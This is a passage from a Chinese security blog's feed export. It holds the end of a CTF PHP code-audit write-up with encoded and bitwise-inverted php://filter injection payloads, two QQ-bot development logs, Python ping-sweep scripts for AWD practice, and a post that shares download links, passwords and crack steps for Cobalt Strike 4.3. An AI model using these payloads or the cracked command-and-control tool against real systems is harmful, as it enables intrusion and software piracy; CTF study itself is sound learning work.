class="language-none">&amp;rce&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php&amp;flag[arg]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);&#x2F;&#x2F;&#x2F;&#x2F;POST记得加个rce&#x3D;2&#x2F;&#x2F;读取get_defined_vars()里的[&#39;_GET&#39;][rce]，然后include出来。&#x2F;&#x2F;如果只是require(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php)是不行的。中间的伪协议串需要取反&#x2F;异或来绕过最后一个正则<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&amp;%66%6c%61%67[%61%72%67]&#x3D;%3b%7d%72%65%71%75%69%72%65%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%5b%5f%47%45%54%5d%5b%72%63%65%5d%29%3b%2f%2f&amp;rce&#x3D;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%72%65%61%31%66%6c%34%67%2e%70%68%70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3.取反+伪协议</p><p>取反可直接绕过正则</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php取反一下;&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>异或不行，禁了^</p><p>4.<code>define</code>定义变量，fopen、fgets读取内容</p><pre class="line-numbers language-none"><code class="language-none">;&#125;define(aaa,fopen(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r));while(!feof(aaa))var_dump(fgets(aaa));fclose(aaa);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="奇文共赏"><a href="#奇文共赏" class="headerlink" title="奇文共赏"></a>奇文共赏</h2><p><a href="https://www.gem-love.com/ctf/770.html">2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> 正则绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ机器人插件:天命之子wiki</title>
      <link href="/p/2830835001.html"/>
      <url>/p/2830835001.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>群友想要个这样的机器人，我想着挺简单的，于是就写了。</p><p>人机交互上不难，重点还是wiki数据库。</p><p>这次数据库是用了ORM，第一次用，有不少麻烦，思路通了就好多了。</p><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p><img src="/../images/QQ%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%8F%92%E4%BB%B6-%E5%A4%A9%E5%91%BD%E4%B9%8B%E5%AD%90wiki/image-20210731210529301.png" alt="image-20210731210529301"></p><h2 id="开发日志"><a href="#开发日志" class="headerlink" title="开发日志"></a>开发日志</h2><h3 id="2021年7月31日21-01-53"><a href="#2021年7月31日21-01-53" class="headerlink" title="2021年7月31日21:01:53"></a>2021年7月31日21:01:53</h3><p>鬼知道这modles能折腾我那么久啊！！！！整整浪费了我一天时间，痛苦面具.jpg</p><p>在此很感谢harukabot的作者sk，耐心指点了很久，给了极大的帮助，节省了很多的时间。要不是她我不知道要折磨到什么时候。</p><p>还好，思路通了，就舒服多了。吭哧吭哧初步框架就写好了，接下来完善下交互逻辑就OK。</p><h3 id="2021年7月30日18-16-40"><a href="#2021年7月30日18-16-40" class="headerlink" title="2021年7月30日18:16:40"></a>2021年7月30日18:16:40</h3><p>当我拍出字符串拼接的sql语句时，群友：“你好，我叫starbucks;drop databases _”。吓得我当场浪子回头开始百度ORM相关。</p><p>纠结了很久，不知道用哪个框架，一番比较之下，用了支持异步的tortoise。</p><p>于是，噩梦开始。</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> QQ机器人插件 </tag>
            
            <tag> Nonebot2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ机器人插件:扫描BUGKU公开AWD房间</title>
      <link href="/p/60536736.html"/>
      <url>/p/60536736.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>QQ机器人开发是我一直以来的梦想啊，当初刚打算写的时候，得，腾讯全面封杀QQ机器人。于是搜了搜，mirai还活着，一看文档，“需要Kotlin”知识，一下把我打退了。</p><p>于是就这样搁置了一年，再搜，nonebot2，python开发。上手试了两天，成功写了个插件demo，真痛快啊。</p><p>期间还重新补习了下异步知识与类型注解。学到了很多。</p><p>折腾了很多天，第一个QQ机器人插件差不多也完工了，起个文当开发记录。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><a href="https://github.com/KagamigawaMeguri/nonebot_plugin_bugku">https://github.com/KagamigawaMeguri/nonebot_plugin_bugku</a></p><h2 id="开发日志"><a href="#开发日志" class="headerlink" title="开发日志"></a>开发日志</h2><h3 id="2021年7月31日20-58-54"><a href="#2021年7月31日20-58-54" class="headerlink" title="2021年7月31日20:58:54"></a>2021年7月31日20:58:54</h3><p>QQ风控真严，整了个小号连图片都发不了，挺烦的。</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> QQ机器人插件 </tag>
            
            <tag> Nonebot2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ping+多线程/协程的Python脚本</title>
      <link href="/p/1603334844.html"/>
      <url>/p/1603334844.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前些日子开始使用bugku的awd平台进行练习，靶机ip还得自己扫，于是为了方便就写了个简单的ping+文件写入脚本，用于扫好ip放入特定txt便于后续脚本读取。</p><p>前几天想着有点慢，于是加了个多线程。</p><p>最近又正好学了异步，抱着大过年的来都来了还只是个孩子心态就尝试用异步来ping。</p><p>没想到一写，才发现之前写的Asyncio笔记有很多错误，果然还是得实践出真知。</p><p>贴个笔记链接：<a href="https://syunaht.com/p/574792763.html">异步Asyncio学习笔记</a></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p><code>ping3.ping</code>的<code>timeout</code>参数类型说明是<code>int</code>，但我换成小数也没问题。</p><p>太小容易误判，太大又过慢，想要最佳化，还是得把握好<code>timeout</code>时间。</p><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ping3 <span class="token keyword">import</span> ping<span class="token punctuation">,</span> verbose_ping<span class="token keyword">import</span> threading<span class="token keyword">import</span> traceback<span class="token keyword">import</span> queue<span class="token keyword">import</span> time<span class="token keyword">class</span> <span class="token class-name">Attack</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_queue <span class="token operator">=</span> queue    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>_queue<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                target <span class="token operator">=</span> self<span class="token punctuation">.</span>_queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>detect<span class="token punctuation">(</span>target<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                traceback<span class="token punctuation">.</span>print_exc<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> ping<span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>        <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> result <span class="token operator">!=</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            alive_target<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    target_exp <span class="token operator">=</span> <span class="token string">'192.168.123.&#123;&#125;'</span>    self_port <span class="token operator">=</span> <span class="token number">999</span>    ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> self_port<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target_exp<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ips<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>ips<span class="token punctuation">)</span><span class="token punctuation">:</span>    clearfile<span class="token punctuation">(</span>bugku_ips_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ips<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>        threadsnum <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ips<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        threadsnum <span class="token operator">=</span> <span class="token number">20</span>  <span class="token comment"># 线程默认值</span>    LocalQueue <span class="token operator">=</span> queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> ip <span class="token keyword">in</span> ips<span class="token punctuation">:</span>        LocalQueue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    threadsCount <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>threadsnum<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>threadsCount<span class="token punctuation">)</span><span class="token punctuation">:</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Attack<span class="token punctuation">(</span>LocalQueue<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        j<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        j<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    timeout <span class="token operator">=</span> <span class="token number">1</span>    alive_target <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    main<span class="token punctuation">(</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>alive_target<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start_time<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>因为ping不支持异步，所以用线程池形式，以空间换时间。</p><p>这个其实和多线程没啥区别，无非一个用手动设置线程，一个自动增加线程。</p><p>不过按理来说还是这个要更好一点，无论是时间还是空间上来说，更为”自动化“，代码更少，而且Python因为有GIL锁，用协程更为适合。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ping3 <span class="token keyword">import</span> ping<span class="token punctuation">,</span> verbose_ping<span class="token keyword">import</span> asyncio<span class="token keyword">import</span> time<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">_ping</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>    future <span class="token operator">=</span> loop<span class="token punctuation">.</span>run_in_executor<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> detect<span class="token punctuation">,</span> target<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>    <span class="token keyword">await</span> future<span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> ping<span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>    <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> result <span class="token operator">!=</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        alive_target<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    target_exp <span class="token operator">=</span> <span class="token string">'192.168.123.&#123;&#125;'</span>    self_port <span class="token operator">=</span> <span class="token number">999</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> self_port<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target_exp<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ips<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    timeout <span class="token operator">=</span> <span class="token number">1</span>    alive_target <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    target_list <span class="token operator">=</span> create<span class="token punctuation">(</span><span class="token punctuation">)</span>    tasks <span class="token operator">=</span> <span class="token punctuation">[</span>_ping<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> target_list<span class="token punctuation">]</span>    asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>alive_target<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start_time<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="协程uvloop"><a href="#协程uvloop" class="headerlink" title="协程uvloop"></a>协程uvloop</h3><p>姑且测试了一下，暂时没感觉出太大区别，可能测试样本太少了。</p><blockquote><p>python模块uvloop暂不支持windows和python3.9</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ping3 <span class="token keyword">import</span> ping<span class="token punctuation">,</span> verbose_ping<span class="token keyword">import</span> asyncio<span class="token keyword">import</span> time<span class="token keyword">import</span> uvloopasyncio<span class="token punctuation">.</span>set_event_loop_policy<span class="token punctuation">(</span>uvloop<span class="token punctuation">.</span>EventLoopPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">_ping</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>    future <span class="token operator">=</span> loop<span class="token punctuation">.</span>run_in_executor<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> detect<span class="token punctuation">,</span> target<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>    <span class="token keyword">await</span> future<span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> ping<span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>    <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> result <span class="token operator">!=</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        alive_target<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    target_exp <span class="token operator">=</span> <span class="token string">'192.168.123.&#123;&#125;'</span>    self_port <span class="token operator">=</span> <span class="token number">999</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> self_port<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target_exp<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ips<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    timeout <span class="token operator">=</span> <span class="token number">1</span>    alive_target <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    target_list <span class="token operator">=</span> create<span class="token punctuation">(</span><span class="token punctuation">)</span>    tasks <span class="token operator">=</span> <span class="token punctuation">[</span>_ping<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> target_list<span class="token punctuation">]</span>    asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>alive_target<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start_time<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>要想更快，还是得从协议入手，换syn扫描之类的。可以，但没必要。再怎么写肯定也没有nmap好用。</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Python </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4.3[20210317]汉化及破解整合</title>
      <link href="/p/1120311950.html"/>
      <url>/p/1120311950.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Cobalt Strike 4.3 (March 17, 2021) [bug fixes]</p><p>资源来源于公众号：<code>孟疾杂记</code>，在此感谢<a href="https://github.com/Twi1ight">Twi1ight</a>无私分享的宝贵资源。</p><p>文件可通过官方哈希验证地址进行sha256验证。</p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><h3 id="CobaltStrike-4-3-20210317-官方jar包"><a href="#CobaltStrike-4-3-20210317-官方jar包" class="headerlink" title="CobaltStrike 4.3[20210317]官方jar包"></a>CobaltStrike 4.3[20210317]官方jar包</h3><p>以下为@Twi1ight发布的下载地址</p><blockquote><p><a href="https://pan.baidu.com/s/11yLBMq392FMXy5GywjbyNQ">https://pan.baidu.com/s/11yLBMq392FMXy5GywjbyNQ</a><br>提取码: xiyg</p><p><a href="https://wwr.lanzoux.com/ii0ehopvdgj">https://wwr.lanzoux.com/ii0ehopvdgj</a><br>密码:3yn1</p></blockquote><p>验证命令(windows自带)</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">certutil -hashfile cobaltstrike.jar SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/CobaltStrike4-3-%E6%B1%89%E5%8C%96%E5%8F%8A%E7%A0%B4%E8%A7%A3%E6%95%B4%E5%90%88/image-20210721140132514.png" alt="image-20210721140132514"></p><h3 id="CobaltStrike-4-3-20210317-破解版"><a href="#CobaltStrike-4-3-20210317-破解版" class="headerlink" title="CobaltStrike 4.3[20210317]破解版"></a>CobaltStrike 4.3[20210317]破解版</h3><blockquote><p>破解思路和以前版本一样，替换resources/authkey.pub，然后自己签发cobaltstrike.auth</p><p>改了四个地方：</p><ol><li>替换resources/authkey.pub文件</li><li>修改common/AuthCrypto.class里面authkey.pub的MD5值</li><li>修复beacon/BeaconData.class里30分钟退出的暗桩</li><li>在aggressor/Aggressor.class的版本号后面加了自己的半个ID</li></ol></blockquote><p>以下为@Twi1ight发布的下载地址</p><blockquote><p><a href="https://pan.baidu.com/s/1vISRhX6ELpaXDVJ4RlWQZQ">https://pan.baidu.com/s/1vISRhX6ELpaXDVJ4RlWQZQ</a><br>提取码: jtv9<br>解压密码: A.F_ck1ng.Gift.for.51.Fr0m.TW</p><p><a href="https://wwr.lanzoux.com/i3X4Sopvdcf">https://wwr.lanzoux.com/i3X4Sopvdcf</a><br>密码:gbs3</p></blockquote><p>因为是直接破解原版jar，所以哈希值与原版不同。</p><h3 id="汉化-破解加载器"><a href="#汉化-破解加载器" class="headerlink" title="汉化+破解加载器"></a>汉化+破解加载器</h3><p><a href="https://github.com/Twi1ight/CSAgent">https://github.com/Twi1ight/CSAgent</a></p><h3 id="汉化破解个人整合版"><a href="#汉化破解个人整合版" class="headerlink" title="汉化破解个人整合版"></a>汉化破解个人整合版</h3><p>这个则是个人整合，除了把上面的资源整合了下，官方jar包+CSAgent，还做了些修改，具体如下：</p><ul><li><p>新增<code>cobalstrike.vbs</code></p><p>windows启动方式，其中jdk路径请自行替换<code>C:\Program Files\Java\jdk-14.0.2\bin\java.exe</code></p><p>优点：任意指定java版本，无需担心系统变量问题</p></li><li><p>新增<code>start.sh</code></p><p>linux启动方式，届时可直接<code>./start.sh</code>启动。代码来源于<code>CSAgent</code></p></li><li><p>修改<code>teamserver</code></p><p>代码来源于<code>CSAgent</code>，加了个<code>--add-opens=java.base/java.lang.reflect=ALL-UNNAMED</code>以忽略warning，具体见后文</p></li></ul><blockquote><p>下载:<a href="https://avalonair.lanzoui.com/i2WHFrodk1a">https://avalonair.lanzoui.com/i2WHFrodk1a</a></p><p>密码:e7fr</p></blockquote><h2 id="相关问题集锦"><a href="#相关问题集锦" class="headerlink" title="相关问题集锦"></a>相关问题集锦</h2><h3 id="WARNING-An-illegal-reflective-access-operation-has-occurred"><a href="#WARNING-An-illegal-reflective-access-operation-has-occurred" class="headerlink" title="WARNING: An illegal reflective access operation has occurred"></a>WARNING: An illegal reflective access operation has occurred</h3><p>teamserver启动报如下错误：</p><p><img src="/../images/CobaltStrike4-3-%E6%B1%89%E5%8C%96%E5%8F%8A%E7%A0%B4%E8%A7%A3%E6%95%B4%E5%90%88/image-20210721142058187.png" alt="image-20210721142058187"></p><p>主要出现在高版本(&gt;=jdk9)情况下，没有影响，忽略就好</p><p>在启动项加个如下命令即可忽略该warning</p><pre class="line-numbers language-none"><code class="language-none">--add-opens&#x3D;java.base&#x2F;java.lang.reflect&#x3D;ALL-UNNAMED<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="官方哈希验证地址"><a href="#官方哈希验证地址" class="headerlink" title="官方哈希验证地址"></a>官方哈希验证地址</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;verify.cobaltstrike.com&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/CobaltStrike4-3-%E6%B1%89%E5%8C%96%E5%8F%8A%E7%A0%B4%E8%A7%A3%E6%95%B4%E5%90%88/image-20210721135356961.png" alt="image-20210721135356961"></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于IDA7.5版本IDApython的api差异问题及解决办法</title>
      <link href="/p/164444668.html"/>
      <url>/p/164444668.html</url>
      
